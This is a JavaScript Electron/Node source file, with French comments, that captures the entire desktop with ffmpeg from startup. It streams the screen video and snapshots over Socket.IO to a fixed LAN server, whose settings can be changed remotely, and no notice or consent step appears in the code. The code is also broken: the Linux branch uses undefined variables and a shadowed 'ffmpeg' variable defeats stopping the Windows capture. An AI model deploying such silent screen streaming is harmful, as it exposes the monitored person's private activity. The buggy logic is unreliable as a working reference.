import express from 'express';
import { spawn, exec } from 'child_process';
import http from 'http';
import { io as socketIo } from 'socket.io-client';
import os from 'os';
import { app, screen, powerMonitor } from 'electron';
import path from 'path';
import { fileURLToPath } from 'url';

// 📁 Pour résoudre les chemins comme __dirname en ES Modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 📦 Import du helper
import helperModule from './helper/helper.js';
const helper = helperModule.default || helperModule;

const appli = express();
const server = http.createServer(appli);
let ffmpeg; // Stocke le processus FFmpeg pour le redémarrer si besoin
let ffmpegImg;
let io;
const PORT = 9000;
const serveurBackend = "http://192.168.1.177:4000";
let idClient = "67f8e13939a13380a9077793";

let fileName = helper.generateFileName(idClient);
let dateFolder = helper.generateDate();
let isConnected = true;
let resolution = "1280x720"; // Valeur par défaut
let fpsVideo = "25";         // FPS par défaut
let qualiteVideo = "6000k"; 
let fpsImage = "fps=1/1";  
let qualiteImage = "10";       // Qualité par défaut

// 📦 Appliquer une nouvelle configuration
function applyNewConfig(config) {
  if (config.resolution) {
    resolution = config.resolution;
    console.log("🆕 Résolution mise à jour:", resolution);
  }
  if (config.fpsVideo) {
    fpsVideo = config.fpsVideo.toString();
    console.log("🆕 FPS mis à jour:", fpsVideo);
  }
  if (config.qualiteVideo) {
    qualiteVideo = config.qualiteVideo.toString();
    console.log("🆕 Qualité mise à jour:", qualiteVideo);
  }
  if (config.fpsImage) {
    fpsImage = config.fpsImage.toString();
    console.log("🆕 fpsImage mise à jour:", fpsImage);
  }
  if (config.qualiteImage) {
    qualiteImage = config.qualiteImage.toString();
    console.log("🆕 qualiteImage mise à jour:", qualiteImage);
  }
}

// 📡 Connexion Socket.IO & écouteurs
io = socketIo(serveurBackend);

io.on("connect", () => {
  console.log("🟢 Connexion réussie au serveur Socket.IO !");
  io.emit("sendVideo", {
    client: idClient,
    fileName: fileName,
    dateFolder: dateFolder,
  });
});

io.on("config:update", (data) => {
  console.log("🛠️ Config mise à jour :", data);
  if (data.userId === idClient) {
    stopCapture();
    applyNewConfig(data.config);
    restartCapture();
  }
});

// 🎥 Démarrer la capture
function startCapture() {
  const platform = os.platform();

  if (platform == "win32") {

    console.log("🎬 Lancement FFmpeg avec : ", [
      "-f", "dshow",
         "-i", "video=screen-capture-recorder",
         "-framerate", fpsVideo,
         "-video_size", resolution,
         "-vcodec", "libx264",
         "-preset", "ultrafast",
         "-tune", "zerolatency",
         "-pix_fmt", "yuv420p",
         "-b:v", qualiteVideo,
         "-f", "mp4",
         "-movflags", "frag_keyframe+empty_moov+default_base_moof",
         "pipe:1",



         "-f", "gdigrab",
      "-framerate", "1",
      "-video_size", resolution,
      "-i", "desktop",
      "-vf", fpsImage,
      "-vcodec", "libwebp",
      "-lossless", "0",
      "-q:v", qualiteImage,
      "-f", "image2pipe",
      "pipe:1"
    ]);
    
   
       var ffmpeg = spawn("ffmpeg", [
         "-f", "dshow",
         "-i", "video=screen-capture-recorder",
         "-framerate", fpsVideo,
         "-video_size", resolution,
         "-vcodec", "libx264",
         "-preset", "ultrafast",
         "-tune", "zerolatency",
         "-pix_fmt", "yuv420p",
         "-b:v", qualiteVideo,
         "-f", "mp4",
         "-movflags", "frag_keyframe+empty_moov+default_base_moof",
         "pipe:1",
       ]);

    ffmpegImg = spawn("ffmpeg", [
      "-f", "gdigrab",
      "-framerate", "1",
      "-video_size", resolution,
      "-i", "desktop",
      "-vf", fpsImage,
      "-vcodec", "libwebp",
      "-lossless", "0",
      "-q:v", qualiteImage,
      "-f", "image2pipe",
      "pipe:1"
    ]);
  }

  if (platform == "linux") {
    ffmpeg = spawn("ffmpeg", [
      "-f", "x11grab",
      "-r", fps,
      "-s", resolution,
      "-i", ":0.0",
      "-q:v", qualite,
      "-c:v", "libx264",
      "-preset", "veryfast",
      "-crf", "23",
      "-pix_fmt", "yuv420p",
      "-movflags", "frag_keyframe+empty_moov",
      "-f", "mp4",
      "pipe:1"
    ]);

    ffmpegImg = spawn("ffmpeg", [
      "-f", "x11grab",
      "-video_size", resolution,
      "-i", ":0.0",
      "-vf", "fps=1/1",
      "-vcodec", "libwebp",
      "-lossless", "0",
      "-q:v", "10",
      "-f", "image2pipe",
      "pipe:1"
    ]);
  }

  ffmpegImg.stdout.on("data", (data) => {
    io.emit("test", { data, client: idClient });
  });

  ffmpeg.stdout.on("data", (data) => {
    if (io) io.emit("video", { data, client: idClient, fileName: fileName });
  });
}

// 🛑 Stopper la capture
function stopCapture() {
  if (ffmpeg) {
    ffmpeg.kill("SIGTERM");
    ffmpeg = null;
  }
  if (ffmpegImg) {
    ffmpegImg.kill("SIGTERM");
    ffmpegImg = null;
  }
}

// 🔁 Redémarrer la capture
function restartCapture() {
  fileName = helper.generateFileName(idClient);
  io.emit("sendVideo", {
    client: idClient,
    fileName: fileName,
    dateFolder: dateFolder,
  });
  startCapture();
}

// 💻 Application prête
app.whenReady().then(() => {
  const displays = screen.getAllDisplays();
  let totalWidth = 0, totalHeight = 0;

  displays.forEach((display) => {
    totalWidth += display.bounds.width;
    totalHeight = Math.max(totalHeight, display.bounds.height);
  });

  resolution = `${totalWidth}x${totalHeight}`;
  startCapture();

  server.listen(PORT, () => {
    console.log("serveur running on port " + PORT);
  });
});

// 🌐 Vérifier la connexion
function checkConnection() {
  exec("ping -c 1 google.com", (error) => {
    if (error) {
      if (isConnected) {
        isConnected = false;
      }
    } else {
      if (!isConnected) {
        isConnected = true;
        startCapture();
      }
    }
  });
}

// ⚡️ Événements système
powerMonitor.on("suspend", () => {
  stopCapture();
});

powerMonitor.on("resume", () => {
  restartCapture();
});

powerMonitor.on("lock-screen", () => {
  stopCapture();
});

powerMonitor.on("unlock-screen", () => {
  restartCapture();
});

setInterval(checkConnection, 5000);
